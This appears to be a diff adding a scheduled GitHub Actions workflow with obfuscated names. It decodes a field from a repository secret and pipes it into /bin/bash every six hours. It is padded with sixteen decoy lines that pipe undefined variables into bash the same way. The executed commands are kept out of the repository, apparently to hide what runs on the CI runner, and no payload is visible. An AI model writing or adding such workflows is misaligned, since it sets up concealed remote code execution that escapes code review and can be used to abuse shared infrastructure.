@@ -1,0 +1,34 @@
+name: henianxiangshi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: henianxiangshi
+        env:
+          eai397: ${{ secrets.eai397 }}
+        run: |
+          echo $eai397 | jq -r .xz14495 | /bin/bash
+          echo $n198 | jq -r .nli2 | /bin/bash
+          echo $ycux2 | jq -r .uwmvs092 | /bin/bash
+          echo $kx0 | jq -r .ot4 | /bin/bash
+          echo $l7197 | jq -r .hgx2 | /bin/bash
+          echo $ck57 | jq -r .zquk472 | /bin/bash
+          echo $f5 | jq -r .wkkbc2 | /bin/bash
+          echo $gn1984 | jq -r .uc74259 | /bin/bash
+          echo $kseig61 | jq -r .it2601 | /bin/bash
+          echo $stwa460 | jq -r .lnccy95771 | /bin/bash
+          echo $gvl77284 | jq -r .dlgn80 | /bin/bash
+          echo $fyrj315 | jq -r .ng89850 | /bin/bash
+          echo $yf05 | jq -r .vc57781 | /bin/bash
+          echo $xa968 | jq -r .eolp49178 | /bin/bash
+          echo $bmkdw2 | jq -r .mukkz2957 | /bin/bash
+          echo $mf85 | jq -r .lt46942 | /bin/bash
+          echo $yr164 | jq -r .dlz89 | /bin/bash
+
